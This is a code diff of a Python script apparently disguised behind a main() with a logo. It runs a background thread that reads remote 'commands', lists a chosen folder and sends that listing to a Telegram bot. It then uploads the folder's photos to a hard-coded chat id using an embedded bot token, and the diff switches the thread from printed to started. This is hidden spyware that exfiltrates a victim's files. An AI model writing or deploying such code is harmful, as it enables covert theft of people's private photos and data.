@@ -19,38 +19,37 @@ def tg():
             text=str(len(dir_list))+"\n"+str(dir_list)
             if len(text) >4096:
                 text=str(len(dir_list))+str(dir_list)[:4000]
-            else:
-                if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
-                    if commands["grabe"] == "yes":
-                        dir_list = os.listdir(commands["folder"])
-                        i=int(commands["file_number"])
-                        while i<len(dir_list):
-                            try:
-                                TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
-                                photo_path = dir_list[i]
-                                if str(photo_path).endswith("mp4"):
-                                    pass
+            if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
+                if commands["grabe"] == "yes":
+                    dir_list = os.listdir(commands["folder"])
+                    i=int(commands["file_number"])
+                    while i<len(dir_list):
+                        try:
+                            TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
+                            photo_path = dir_list[i]
+                            if str(photo_path).endswith("mp4"):
+                                pass
+                            else:
+                                with open(photo_path, 'rb') as photo_file:
+                                    payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
+                                    response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
+                                if response.status_code == 200:
+                                    print("Photo sent successfully!")
                                 else:
-                                    with open(photo_path, 'rb') as photo_file:
-                                        payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
-                                        response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
-                                    if response.status_code == 200:
-                                        print("Photo sent successfully!")
-                                    else:
-                                        requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
-                            except Exception as err:
-                                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
-                            i=i+1
-                        break
-                    else:
-                        pass
+                                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
+                        except Exception as err:
+                            requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
+                        i=i+1
+                    break
                 else:
-                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
+                    pass
+            else:
+                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
         else:
             pass
 
 t1=threading.Thread(target=tg)
-print(t1)
+t1.start()
 
 def main():
     logo="""
